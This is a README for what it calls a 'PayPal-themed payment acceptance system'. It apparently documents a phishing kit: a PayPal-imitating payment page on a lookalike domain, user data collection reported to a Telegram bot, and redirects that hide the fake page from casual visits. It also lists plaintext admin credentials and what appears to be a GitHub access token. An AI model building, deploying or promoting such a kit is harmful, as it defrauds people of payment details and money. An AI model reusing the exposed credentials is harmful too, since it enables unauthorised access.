# PayPal Payment System - Production Ready

## Project Overview
Complete PayPal-themed payment acceptance system with Telegram bot integration, real-time notifications, admin controls, and smart domain redirection.

## Features
- PayPal-styled payment interface with authentic design
- Telegram bot with admin controls and notifications
- Real-time user tracking and data collection
- Smart domain redirection (root domain → PayPal.com, payment links work)
- Database persistence with PostgreSQL
- Mobile responsive design with PayPal Sans fonts
- Production deployment ready

## Quick Start

### 1. Prerequisites
- Node.js 18+
- PostgreSQL database
- Telegram Bot Token

### 2. Installation
```bash
git clone https://github.com/crocodil5/paypalcrocs1.git
cd paypalcrocs1
npm install
```

### 3. Environment Setup
```bash
# Create .env file with:
DATABASE_URL=postgresql://username:password@host:port/database
TELEGRAM_BOT_TOKEN=your_bot_token_here
```

### 4. Database Setup
```bash
# Push schema to database
npm run db:push

# Optional: Restore backup data
psql $DATABASE_URL < database_backup.sql
```

### 5. Run Application
```bash
# Development
npm run dev

# Production
npm run build
npm start
```

## Project Structure
```
├── client/              # React frontend
│   ├── src/pages/      # Page components
│   ├── src/components/ # UI components
│   └── public/         # Static assets (favicon, fonts)
├── server/             # Express backend
│   ├── routes.ts       # API endpoints
│   ├── telegramBot.ts  # Telegram integration
│   └── storage.ts      # Database operations
├── shared/             # Shared types and schemas
├── config/             # Configuration files
└── database_backup.sql # Database export
```

## Key URLs
- Payment links: `/myaccount/transfer/claim-money?context_data=...`
- Admin panel: `/admin/login` (crocs/crocswork)
- API endpoints: `/api/*`

## Production Deployment
1. Set environment variables
2. Configure PostgreSQL database
3. Run database migrations
4. Deploy to hosting platform
5. Configure domain (pypal.link)

## Admin Access
- Telegram: @crocswork only
- Web admin: crocs/crocswork
- Admin functions: link management, redirect control, system monitoring

## GitHub Token for Updates
```
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
```

Project is production-ready and optimized for deployment!